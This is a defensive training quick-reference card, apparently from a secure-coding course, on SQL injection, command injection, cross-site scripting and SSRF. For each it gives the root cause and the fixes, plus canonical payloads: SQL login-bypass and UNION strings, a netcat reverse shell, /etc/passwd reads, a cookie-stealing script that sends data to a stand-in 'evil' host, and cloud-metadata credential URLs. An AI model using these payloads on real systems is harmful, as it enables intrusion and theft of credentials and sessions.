@@ -1,0 +1,119 @@
++--------------------------------------------------+-------------------+
+| **INJECTION ATTACKS --- QUICK REFERENCE CARD**   | **BBC Academy /   |
+|                                                  | JBI Training**    |
+| *Modules 6 & 7: A03 Injection and A10 SSRF \|    |                   |
+| All four types, one principle \| Keep for        |                   |
+| reference*                                       |                   |
++--------------------------------------------------+-------------------+
+
++----------------+----------------+----------------+-----------------+
+| > **A03 SQL    | > **A03        | > **A03        | > **A10         |
+| > INJECTION**  | > COMMAND      | > CROSS-SITE   | > SERVER-SIDE   |
+| >              | > INJECTION**  | > SCRIPTING**  | > REQUEST       |
+| > **ROOT       | >              | >              | > FORGERY**     |
+| > CAUSE**      | > **ROOT       | > **ROOT       | >               |
+| >              | > CAUSE**      | > CAUSE**      | > **ROOT        |
+| > User input   | >              | >              | > CAUSE**       |
+| > is           | > User input   | >              | >               |
+| > concatenated | > is           |  User-supplied | > The server    |
+| > into a SQL   | > concatenated | > content is   | > fetches a URL |
+| > string. The  | > into a       | > rendered as  | > or resource   |
+| > database     | > string       | > HTML in      | > specified by  |
+| > cannot       | > passed to an | > another      | > user input.   |
+| > distinguish  | > OS shell.    | > user\'s      | > The attacker  |
+| > data from    | > The shell    | > browser      | > redirects the |
+| > command      | > interprets   | > without      | > server to     |
+| > syntax ---   | >              | > escaping.    | > targets it    |
+| > so the       | metacharacters | > The browser  | > can reach but |
+| > attacker     | > --- so the   | > executes it  | > the attacker  |
+| > writes SQL.  | > attacker     | > as           | > cannot.       |
+| >              | > writes shell | > JavaScript.  | >               |
+| > **CANONICAL  | > commands.    | >              | > **CANONICAL   |
+| > PAYLOADS**   | >              | > **CANONICAL  | > PAYLOADS**    |
+| >              | > **CANONICAL  | > PAYLOADS**   | >               |
+| > Login        | > PAYLOADS**   | >              | > Cloud         |
+| > bypass:      | >              | > Reflected:   | > metadata:     |
+| >              | > Chaining: ;  | >              | >               |
+| > \' OR 1=1\-- | > id           |  ?q=\<script\> | > http://1      |
+| >              | >              | >              | 69.254.169.254/ |
+| > UNION dump:  | > Chaining: && | > alert(do     | >               |
+| >              | > whoami       | cument.cookie) | > latest        |
+| > \' UNION     | >              | >              | /meta-data/iam/ |
+| > SELECT       | > Read file: ; | > \</script\>  | >               |
+| > username,    | > cat          | >              | > securi        |
+| >              | > /etc/passwd  | > Stored       | ty-credentials/ |
+| >              | >              | > (cookie      | >               |
+|  password_hash | > Reverse sh:  | > theft):      | > Internal:     |
+| > FROM         | > \| nc atk    | >              | >               |
+| > users\--     | > 4444         | > \<img src=x  | > http://local  |
+| >              | >              | > onerror=     | host:8080/admin |
+| > **WHAT       | > **WHAT       | >              | >               |
+| > ATTACKER     | > ATTACKER     | > fetch(\      | > **WHAT        |
+| > ACHIEVES**   | > ACHIEVES**   | '//evil/?c=\'+ | > ATTACKER      |
+| >              | >              | >              | > ACHIEVES**    |
+| >              | > Arbitrary OS | > btoa(docum   | >               |
+| Authentication | > commands as  | ent.cookie))\> | > Cloud IAM     |
+| > bypass; full | > the web      | >              | > credential    |
+| > database     | > server user. | > **WHAT       | > theft (grants |
+| >              | > File         | > ATTACKER     | > console       |
+|  exfiltration; | > read/write,  | > ACHIEVES**   | > access);      |
+| > read/write   | > lateral      | >              | > internal      |
+| > arbitrary    | > movement,    | > Session      | > service       |
+| > data; in     | > data         | > hijacking    | > access;       |
+| > some         | >              | > via cookie   | > internal port |
+| > c            |  exfiltration, | > theft;       | > scanning;     |
+| onfigurations: | > reverse      | > credential   | > data          |
+| > OS command   | > shell, full  | > harvesting   | > exfiltration  |
+| > execution    | > system       | > via overlay; | > via HTTP/DNS. |
+| > via          | > compromise.  | > keylogging;  | >               |
+| > xp_cmdshell. | >              | > BeEF browser | > **THE FIX**   |
+| >              | > **THE FIX**  | > hooking;     | >               |
+| > **THE FIX**  | >              | > malware      | > Server-side   |
+| >              | > subp         | > delivery to  | > allowlist of  |
+| >              | rocess.run(\[\ | > every        | > permitted URL |
+|  Parameterised | 'ping\',\'-c\' | > visitor      | > schemes and   |
+| > queries:     | ,\'1\',host\], | > (stored      | > hosts. Never  |
+| > db.ex        | > shell=False) | > XSS).        | > let user      |
+| ecute(\"SELECT | > Pass command | >              | > input         |
+| > \* FROM      | > as a list    | > **THE FIX**  | > directly      |
+| > users WHERE  | > --- no shell | >              | > specify a URL |
+| > username =   | > means no     | >              | > the server    |
+| > ?\", (u,))   | > m            |  Output-encode | > will fetch.   |
+| > The query    | etacharacters. | > all user     | > Use a         |
+| > shape is     | > Validate     | > content on   | > firewalled    |
+| > fixed;       | > input        | > render. In   | > egress proxy  |
+| > values       | > against a    | > Jinja2: {{   | > for           |
+| > cannot alter | > strict       | > var }} not   | > legitimate    |
+| > it.          | > allowlist    | > {{ var\|safe | > outbound      |
+| >              | > before any   | > }}. Apply    | > requests.     |
+| > *Also        | > OS call.     | > Content-S    | >               |
+| > effective:   | >              | ecurity-Policy | > *Especially   |
+| > ORMs (use    | > *Never:      | > header to    | > severe in     |
+| > safely ---   | > os.system(), | > block inline | > cloud:        |
+| > raw()        | > os.popen(),  | > script even  | > AWS/GCP/Azure |
+| > methods      | > subprocess.r | > if encoding  | > metadata      |
+| > reintroduce  | un(shell=True) | > is missed.   | > endpoints     |
+| > risk). Never | > with any     | >              | > return        |
+| > use string   | > u            | > *Three       | > credentials.  |
+| > formatting   | ser-controlled | > subtypes:    | > IMDS v2 (AWS) |
+| > inside SQL   | > value.*      | > Reflected    | > requires a    |
+| > calls.*      |                | > (URL),       | > PUT-then-GET  |
+|                |                | > Stored       | > --- mitigates |
+|                |                | > (database),  | > naive SSRF.*  |
+|                |                | > DOM-based    |                 |
+|                |                | > (client JS). |                 |
+|                |                | > HttpOnly     |                 |
+|                |                | > cookie flag  |                 |
+|                |                | > prevents JS  |                 |
+|                |                | > reading      |                 |
+|                |                | > session      |                 |
+|                |                | > tokens.*     |                 |
++----------------+----------------+----------------+-----------------+
+
+  -----------------------------------------------------------------------
+  **UNIFYING PRINCIPLE:** Injection occurs whenever **untrusted data** is
+  interpreted as **code or commands.** The fix is always: keep data and
+  code **structurally separate** --- parameterise, allowlist, encode, and
+  never concatenate.
+
+  -----------------------------------------------------------------------
